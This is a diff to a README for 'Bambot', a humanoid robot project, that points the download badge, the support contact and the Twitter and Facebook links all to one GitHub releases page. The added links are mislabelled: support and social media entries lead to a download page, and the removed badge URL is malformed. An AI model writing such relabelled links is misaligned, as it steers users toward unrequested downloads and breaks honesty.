@@ -17,7 +17,7 @@ Welcome to the official GitHub repository of Bambot, a low-cost humanoid robot p
 
 ## Access the Latest Release
 Click the button below to download the latest release of Bambot:
-[![Download Bambot](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Bambot](https://github.com/gururaj9790/bambot/releases)](https://github.com/gururaj9790/bambot/releases)
 
 ## Getting Started
 To start exploring the world of Bambot, follow these simple steps:
@@ -34,12 +34,12 @@ To start exploring the world of Bambot, follow these simple steps:
 We welcome contributions from the community to enhance the capabilities of Bambot. If you have any suggestions, improvements, or new features to add, feel free to submit a pull request.
 
 ## Support
-For any issues or technical support regarding Bambot, please reach out to our team at [support@bambot.io](mailto:support@bambot.io).
+For any issues or technical support regarding Bambot, please reach out to our team at [https://github.com/gururaj9790/bambot/releases](https://github.com/gururaj9790/bambot/releases).
 
 ## Stay Connected
 Stay updated on the latest news, releases, and projects by following us on social media:
-- Twitter: [@BambotOfficial](https://twitter.com/BambotOfficial)
-- Facebook: [Bambot](https://www.facebook.com/Bambot)
+- Twitter: [@BambotOfficial](https://github.com/gururaj9790/bambot/releases)
+- Facebook: [Bambot](https://github.com/gururaj9790/bambot/releases)
 
 ---
 
